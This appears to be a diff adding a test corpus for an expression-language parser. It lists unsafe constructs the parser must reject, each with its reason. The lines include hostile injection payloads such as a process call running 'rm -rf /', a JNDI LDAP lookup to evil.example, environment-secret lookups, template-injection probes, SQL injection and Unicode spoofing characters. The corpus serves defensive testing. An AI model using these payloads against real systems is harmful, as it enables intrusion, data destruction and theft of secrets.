@@ -1,0 +1,162 @@
+@@ The corpus of unsafe constructs (Sprint 13, ADR-0081).
+@@
+@@ One construct per line: the text of an expression, a TAB, then why it is unsafe. Every line must be rejected at parse
+@@ or check time with an expression error that names a place, and nothing may be executed (UnsafeCorpusTest). A line that
+@@ starts with two at signs is a comment. In the text, the sequence backslash-u followed by four hex digits stands for
+@@ that character, so that invisible and look-alike characters can be written down and seen. To add a line: write the
+@@ construct, a TAB and the reason; to see that the test can fail, follow "Sprint 13 manual testing.md".
+@@
+@@ ---- Java and reflection: the language has no dot, no method call and no way to name a class ----
+Runtime.getRuntime().exec('rm -rf /')	Java call chain that starts a process
+System.exit(0)	Java static call that stops the virtual machine
+Class.forName('java.lang.Runtime')	reflection: load a class by name
+getClass()	reflection: a call that is not in the fixed library
+this.getClass()	reflection through this
+'abc'.getClass()	reflection through a text literal
+Name.getClass().getName()	reflection through a field
+java.lang.Runtime	a package path
+java.io.File	a package path
+new java.io.File('/etc/passwd')	object creation with the word new
+new Object()	object creation without a package
+Thread.sleep(100000)	a call that blocks the thread
+ProcessBuilder('sh').start()	a call that starts a process
+exec('ls')	the name of a function that does not exist: execute a command
+execute('ls')	the name of a function that does not exist: execute
+system('ls')	the name of a function that does not exist: system call
+shell('ls')	the name of a function that does not exist: shell
+eval('1 + 1')	the name of a function that does not exist: evaluate text as code
+fileRead('/etc/passwd')	the name of a function that does not exist: read a file
+networkCall('http://example.test')	the name of a function that does not exist: network
+reflection()	the name of a function that does not exist: reflection
+forName('x')	reflection: the method that loads a class
+invoke(Name)	reflection: invoke a method
+getRuntime()	a call that is not in the fixed library
+@@ ---- method calls and property chains ----
+Name.length()	method call on a field
+Name.toUpperCase()	method call on a field
+Name.length	property read on a field
+Account.Name	a field of another object (comes with a later release)
+Account.Owner.Name	a chain of fields of other objects
+Name[0]	index into a field
+Name['x']	look up by key
+Name?.length	null-safe property access
+Name::length	method reference
+quantity__c.intValue()	method call on a number field
+(1 + 2).toString()	method call on a bracket
+'text'.length()	method call on a literal
+@@ ---- escapes of other expression and template languages ----
+${7*7}	template placeholder
+#{7*7}	expression-language placeholder
+T(java.lang.Runtime).getRuntime()	type reference of an expression language
+#this	variable reference of an expression language
+@bean	bean reference of an expression language
+{{7*7}}	template engine delimiters
+<%= 7*7 %>	server page scriptlet
+%{7*7}	action-framework expression
+$[1]	selector of another expression language
+${jndi:ldap://evil.example/a}	logging-library lookup with a directory URL
+${env:SECRET}	lookup of an environment variable
+${sys:user.home}	lookup of a system property
+@@ ---- JNDI, URL and file strings written as code, not as text ----
+jndi:ldap://evil.example/a	a directory URL used as code
+ldap://evil.example/a	a directory URL
+rmi://evil.example/a	a remote-object URL
+http://evil.example/	a web address used as code
+file:///etc/passwd	a file URL used as code
+javascript:alert(1)	a script URL
+data:text/html;base64,AAAA	a data URL
+\\evil.example\share	a network path
+@@ ---- assignment, statements, loops, user-defined functions, lambdas ----
+a = 1; b = 2	two statements
+quantity__c = 1; DROP TABLE x	a statement separator
+x := 5	assignment
+quantity__c += 1	compound assignment
+quantity__c++	increment
+FOR(i, 1, 10)	a loop
+WHILE(TRUE)	a loop
+LOOP(1)	a loop
+function f() { return 1 }	a user-defined function
+def f(x): x	a user-defined function
+LAMBDA(x, x)	a lambda
+x => x	an arrow function
+() -> 1	a lambda
+1 ? 2 : 3	a conditional operator of other languages
+IF	a function name used as a field
+TRUE(1)	a call of a word that is not a function
+NULL()	a call of a word that is not a function
+AND(TRUE, FALSE)	AND is an operator, not a function
+OR(1, 2)	OR is an operator, not a function
+1 + NOT 2	NOT in the middle of a sum
+@@ ---- regular expressions (slow matching) and other things the library does not have ----
+MATCHES(Name, '(a+)+$')	a regular expression with catastrophic backtracking
+REGEX(Name, '.*')	a regular expression
+REPLACE(Name, 'a', 'b')	a function that is not in the library
+Name =~ 'a.*'	a regular expression operator
+Name LIKE 'a%'	a pattern operator
+SUM(quantity__c)	an aggregate over records
+REPEAT('a', 1000000)	a function that makes enormous texts
+POWER(2, 1000)	a power function
+2 ^ 10	a power operator
+2 ** 1000	a power operator
+SQRT(2)	a function that is not in the library
+RANDOM()	a function that makes the answer different every time
+UUID()	a function that makes the answer different every time
+@@ ---- comments, quotes and characters that start other languages ----
+1 /* comment */ + 2	a block comment
+1 // comment	a line comment
+1 # comment	a comment character
+1 ; 2	a statement separator
+"double quoted"	text is written between single quotes
+`backtick`	a template literal
+Name == 'x'	a double equals
+Name <> 'x'	a not-equal operator of other languages
+Name && Stage	a symbol for AND
+Name || Stage	a symbol for OR
+!Name	a bang for NOT
+@@ ---- numbers that are not plain decimals, or that overflow ----
+1e5	an exponent
+1E999999999	an exponent that would make an enormous number
+0x1F	a hexadecimal number
+1_000	digit separators
+.5	a number with no digit before the point
+5.	a number with no digit after the point
+1.2.3	two points
+99999999999999999999999999999	more than 28 digits before the point
+1.00000000001	more than 10 digits after the point
+NaN	not a number
+Infinity	not a number
+@@ ---- look-alike, invisible and control characters outside a text ----
+\u041dame	a Cyrillic capital letter in place of a Latin one
+\uFF29\uFF26(TRUE, 1, 2)	full-width letters in place of the name of a function
+qua\u200Bntity__c	a zero-width space inside a name
+quantity__c\u200B + 1	a zero-width space after a name
+1 \u202E+ 2	a right-to-left override before an operator
+1\u00A0+ 2	a no-break space in place of a space
+\uFEFF1	a byte order mark
+1 + 2\u0000	a null character
+1 +\u000B 2	a vertical tab
+\u2028 1	a line separator
+\u2018x\u2019	curly quotes in place of straight quotes
+quantity__c \u2212 1	a minus sign that is not a hyphen
+quantity__c \uFF0B 1	a full-width plus
+'text\u202E'	a right-to-left override inside a text
+'te\u200Bxt'	a zero-width space inside a text
+'te\u0007xt'	a control character inside a text
+@@ ---- constructs that are too big or too slow, written out in the test as well: here the small versions ----
+Name	a plain field of the wrong type for a rule: a rule must give true or false
+quantity__c + price__c	a number where a rule needs true or false
+'a' + 'b'	a plus on text
+NULL	a lone NULL gives no type
+TRUE AND 1	AND with a number
+NOT 'a'	NOT with text
+'a' < TRUE	ordering a boolean
+quantity__c = 'x'	comparing a number with text
+quantity__c < Name	ordering a number and a text
+ROUND(quantity__c)	too few arguments
+LEN()	no argument
+LEN(Name, Name)	too many arguments
+IF(TRUE, 1, 'a')	the two results of IF are of different types
+LEFT(quantity__c, 2)	text function on a number
+unknownField__c > 0	a field the object does not have
+CONCAT('a')	too few arguments
+DATE(2030, 2, 31) = 'x'	comparing a date with text
